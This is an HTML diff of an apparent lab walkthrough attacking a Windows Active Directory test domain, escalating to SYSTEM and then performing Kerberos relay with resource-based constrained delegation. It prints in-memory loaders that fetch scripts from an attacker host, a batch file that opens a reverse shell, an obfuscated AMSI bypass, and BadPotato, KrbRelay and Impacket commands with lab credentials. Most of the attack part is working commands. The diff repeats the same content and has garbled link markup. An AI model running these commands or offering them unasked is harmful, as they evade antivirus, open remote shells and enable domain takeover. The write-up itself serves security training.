+<p>Let’s use WinPEAS script to enumerate the machine and try to escalate our privilege. We can avoid AV detection now by hosting our LinPEAS on our attacking machine and load it in memory and play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly)</p>
+<p>If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use <a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">PowerSharpPack</a> and get everything done for you (thanks again to <span class="citation" data-cites="ShitSecure">@ShitSecure</span>).</p>
+<pre class="bash"><code>iex(new-object net.webclient).downloadstring(&#39;http://10.4.10.1:8080/PowerSharpPack.ps1&#39;)
+PowerSharpPack -winPEAS</code></pre>
+<p>After executing it we just have to wait for it and see the magic happening.</p>
+<p>Analyzing winPEAS output, we can see that we do have some <code>SetImpersonatePrivilege</code> on the current user, so we can use it for privesc.</p>
+<figure>
+<img src="images/image-199.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>## **SeImpersonatePrivilege to Authority*</p>
+<p>To escalate privileges from our low level user taking advantage of the <code>SetImpersonatePrivilege</code>, we can use one of the POTATOES techniques.</p>
+<p>You can learn more about <strong><em>Potatoes Windows Privilege Escalation</em></strong> here: <a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></p>
+<p>For this one we will use <a href="https://github.com/CCob/SweetPotato">SweetPotato</a> which is a compilation of all potatoes.</p>
+<pre class="bash"><code>echo &quot;@echo off&quot; &gt; runme.bat
+echo &quot;start /b $(python3 Shell_ConvB64.py 10.4.10.1 4445)&quot; &gt;&gt; runme.bat
+echo &quot;exit /b&quot; &gt;&gt; runme.bat</code></pre>
+<figure>
+<img src="images/image-200.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
 <ul>
-<li>By default the tool use the <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank">printSpoofer technic</a> by @itm4n</li>
+<li>By default the tool use the <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">printSpoofer technic</a> by <span class="citation" data-cites="itm4n">@itm4n</span></li>
 <li>If you don’t want to compile sweet patatoes we can also do that with BadPotato from PowerSharpPack (First we must bypass AMSI or it will be detected)</li>
-    
-    <pre><code class="language-bash">    $x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
 </ul>
-    iex(new-object system.net.webclient).downloadstring('http://10.4.10.1:8080/amsi.txt')
-    iex(new-object net.webclient).downloadstring('http://10.4.10.1:8081/Invoke-BadPotato.ps1')
-    Invoke-BadPotato -Command "c:\tmp\runme.bat"
-    </code></pre>
-    
-    We have been able to escalate our privilege from low level user to <code>NT Authority\System</code>
-    
-    <img src="images/image-201.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    # <strong>KrbRelay Up</strong>
-    
-    Another way to escalate privilege here is Kerberos Relay, to achieve that we can use krbRelayUp.
-    Since krbRelayUp is easily detected by Windows Defender we need to be very caution for this attack in order to avoid AV detection.
-    
-    NOTE: The conditions to exploit this privesc is LDAP signing is <code>NOT</code> enforced, we can check that with NetExec ldap-signing module.
-    
-    Let’s use <a href="https://www.netexec.wiki/" target="_blank">NetExec</a> to enumerate it.
-    
-    <code>netexec ldap 10.4.10.10-12 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M ldap-checker</code>
-    
-    <img src="images/image-202.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    We can see above that LDAP Signing is NOT enforced in hosts 10.4.10.10,11 and .12 as well.
-    
-    ### <strong>Add computer and RBCD</strong>
-    
-    To exploit krbrelay by adding a computer, we must be able to add new Computer, we can check that with NetExec MAQ module as well.
-    
-    <code>netexec ldap 10.4.10.11 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M MAQ</code>
-    
-    We can see above that we can add up to <code>10</code> in domain with user <code>jon.snow</code> in hosts 10.4.10.11!
-    
-    <img src="images/image-203.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    Now let’s add the computer.
-    
-    ### Add computer
-    
-    Using <a href="http://addcomputer.py" target="_blank">addcomputer.py</a> by Impacket.
-    
-    <a href="http://addcomputer.py/" target="_blank"><code>addcomputer.py&lt;/a&gt; -computer-name 'krbrelay$' -computer-pass 'ComputerPass' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'</code>
-    
-    <img src="images/image-204.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    The message above confirms that we were able to add a new computer called <code>krbrelay$</code>.
-    
-    ### Get the SID of that computer
-    
-    Now we need to get the SID of the computer (Let’s execute it inside our shell in the target machine - PowerShell)
-    
-    <code>$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID
-    (New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value</code>
-    
-    <img src="images/image-205.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    <code>S-1-5-21-1696939732-3083896300-4009139380-1122</code>
-    
-    Uploading File in Powershell.
-    
-    <code>(New-Object System.Net.WebClient).DownloadFile('&lt;a href="http://192.168.56.1:8080/CheckPort.exe','C:%5C%5Ctmp%5C%5CCheckPort.exe" target="_blank"&gt;http://10.4.10.1:8080/CheckPort.exe','C:\\tmp\\CheckPort.exe&lt;/a&gt;')</code>
-    
-    Now let’s check what ports we can use  internally for this attack by checking what ports can communicate out.  For this we can use CheckPort.exe from KrbRelay.
-    
-    <img src="images/image-206.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    We can see that System is allowed through port 10 in this target.
-    
-    Ok now let’s launch the KrbRelay.
-    
-    <code>.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1696939732-3083896300-4009139380-1122 -port 10</code>
-    
-    <strong><code>-rbcd</code></strong> - Is the current machine SID
-    
-    <strong><code>-clsid&lt;/strong&gt; -</code>CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)
-    
-    <img src="images/image-207.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    Now we can finish the RBCD exploitation using impacket.
-    
-    Using <a href="http://getTGT.py" target="_blank">getTGT.py</a> we uses a valid krbrelay’s NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.
-    
-    <code>getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPass'</code>
-    
-    <img src="images/image-208.png" alt="Untitled" class="article-image" loading="lazy">
-    
-    We were able to retrieve the krbrelay$.ccache to our attacking machine.
-    Now that we detain the Ticket Granting Ticket, we can use it to request the Administrator Service Ticket.
+<pre class="bash"><code>$x=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39;+&#39;siUt&#39;+&#39;ils&#39;);$y=$x.GetField(&#39;am&#39;+&#39;siCon&#39;+&#39;text&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;);$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
+iex(new-object system.net.webclient).downloadstring(&#39;http://10.4.10.1:8080/amsi.txt&#39;)
+iex(new-object net.webclient).downloadstring(&#39;http://10.4.10.1:8081/Invoke-BadPotato.ps1&#39;)
+Invoke-BadPotato -Command &quot;c:\tmp\runme.bat&quot;</code></pre>
+<p>We have been able to escalate our privilege from low level user to <code>NT Authority\System</code></p>
+<figure>
+<img src="images/image-201.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p># <strong>KrbRelay Up</strong></p>
+<p>Another way to escalate privilege here is Kerberos Relay, to achieve that we can use krbRelayUp. Since krbRelayUp is easily detected by Windows Defender we need to be very caution for this attack in order to avoid AV detection.</p>
+<p>NOTE: The conditions to exploit this privesc is LDAP signing is <code>NOT</code> enforced, we can check that with NetExec ldap-signing module.</p>
+<p>Let’s use <a href="https://www.netexec.wiki/">NetExec</a> to enumerate it.</p>
+<p><code>netexec ldap 10.4.10.10-12 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M ldap-checker</code></p>
+<figure>
+<img src="images/image-202.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>We can see above that LDAP Signing is NOT enforced in hosts 10.4.10.10,11 and .12 as well.</p>
+<p>### <strong>Add computer and RBCD</strong></p>
+<p>To exploit krbrelay by adding a computer, we must be able to add new Computer, we can check that with NetExec MAQ module as well.</p>
+<p><code>netexec ldap 10.4.10.11 -u 'jon.snow' -p 'iknownothing' -d 'north.sevenkingdoms.local' -M MAQ</code></p>
+<p>We can see above that we can add up to <code>10</code> in domain with user <code>jon.snow</code> in hosts 10.4.10.11!</p>
+<figure>
+<img src="images/image-203.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>Now let’s add the computer.</p>
+<p>### Add computer</p>
+<p>Using <a href="http://addcomputer.py">addcomputer.py</a> by Impacket.</p>
+<p>[<code>addcomputer.py](http://addcomputer.py/) -computer-name 'krbrelay$' -computer-pass 'ComputerPass' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'</code></p>
+<figure>
+<img src="images/image-204.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>The message above confirms that we were able to add a new computer called <code>krbrelay$</code>.</p>
+<p>### Get the SID of that computer</p>
+<p>Now we need to get the SID of the computer (Let’s execute it inside our shell in the target machine - PowerShell)</p>
+<p><code>$o = ([ADSI]"LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local").objectSID   (New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value</code></p>
+<figure>
+<img src="images/image-205.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p><code>S-1-5-21-1696939732-3083896300-4009139380-1122</code></p>
+<p>Uploading File in Powershell.</p>
+<p><code>(New-Object System.Net.WebClient).DownloadFile('[http://10.4.10.1:8080/CheckPort.exe','C:\\tmp\\CheckPort.exe](http://192.168.56.1:8080/CheckPort.exe','C:%5C%5Ctmp%5C%5CCheckPort.exe)')</code></p>
+<p>Now let’s check what ports we can use internally for this attack by checking what ports can communicate out. For this we can use CheckPort.exe from KrbRelay.</p>
+<figure>
+<img src="images/image-206.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>We can see that System is allowed through port 10 in this target.</p>
+<p>Ok now let’s launch the KrbRelay.</p>
+<p><code>.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1696939732-3083896300-4009139380-1122 -port 10</code></p>
+<p><strong><code>-rbcd</code></strong> - Is the current machine SID</p>
+<p>**<code>-clsid** -</code>CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)</p>
+<figure>
+<img src="images/image-207.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>Now we can finish the RBCD exploitation using impacket.</p>
+<p>Using <a href="http://getTGT.py">getTGT.py</a> we uses a valid krbrelay’s NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.</p>
+<p><code>getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$':'ComputerPass'</code></p>
+<figure>
+<img src="images/image-208.png" alt="Untitled" />
+<figcaption aria-hidden="true">Untitled</figcaption>
+</figure>
+<p>We were able to retrieve the krbrelay$.ccache to our attacking machine. Now that we detain the Ticket Granting Ticket, we can use it to request the Administrator Service Ticket.</p></li>
+</ul>
+
         </section>
       </article>
     </div>
